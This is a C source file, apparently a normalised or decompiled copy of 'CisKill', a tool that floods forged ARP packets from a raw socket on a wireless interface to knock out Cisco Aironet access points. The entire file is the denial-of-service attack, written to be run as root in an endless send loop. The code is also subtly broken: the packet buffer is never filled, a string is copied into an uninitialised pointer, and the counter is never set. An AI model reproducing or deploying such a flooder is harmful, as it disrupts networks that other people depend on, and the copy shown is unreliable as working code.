
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr {int sa_data; int sa_family; } ;
typedef int sin ;
typedef int in_addr_t ;
typedef int FILE ;


 int AF_UNSPEC ;
 int PF_INET ;
 int SOCK_PACKET ;
 int exit (int) ;
 int fclose (int *) ;
 int * fopen (char*,char*) ;
 int fscanf (int *,char*,int*) ;
 scalar_t__ getuid () ;
 int memset (struct sockaddr*,int ,int) ;
 char* pkt ;
 int printf (char*,...) ;
 int rand () ;
 int sendto (int,char*,int,int ,struct sockaddr*,int) ;
 int sleep (int) ;
 int socket (int ,int ,int) ;
 int srand (int) ;
 int strcpy (char*,char*) ;
 int strncpy (int ,char*,int) ;

int main(int argc, char **argv) {
 FILE *fp;
 int sock, seed;
 long count;
 char *device;
 in_addr_t addr;
 struct sockaddr sin;

 printf("CisKill -- Aironet Cisco Killer\nCoded by: Pasv\nDiscovery credit: Eric Smith\n");
 if(getuid()) {
  printf("Must be root to inject arp packets!\n");
  exit(1);
 }

 if(argc != 2) {
  strcpy(device,"wlan0");
 }
 else {
  device=argv[1];
 }

 fp = fopen("/dev/urandom", "r");
 fscanf(fp,"%d", &seed);
 fclose(fp);
 srand(seed);

 memset(&sin, 0, sizeof(sin));
 sin.sa_family = AF_UNSPEC;
 strncpy(sin.sa_data,device, 14);

 sock = socket(PF_INET, SOCK_PACKET, 0x300);

 printf("Using device: %s\n\n", device);


 printf("Press ctrl+c immediately if you wish to stop\nGoing in 5\n");
 sleep(1);printf(" 4\n");sleep(1);printf(" 3\n");sleep(1);printf(" 2\n");sleep(1);printf(" 1!\n");sleep(1);

 while(1) {
  addr = (rand()%0xff)+(rand()%0xff)+(rand()%0xff)+(rand()%0xff);
  pkt[28] = (char)addr;
  pkt[38] = (char)addr;
  count++;
  printf("#:%ld bytes sent: %d (should be 42)\n",count, sendto(sock, pkt, 42, 0, (struct sockaddr *)&sin, sizeof(sin)));
 }
}
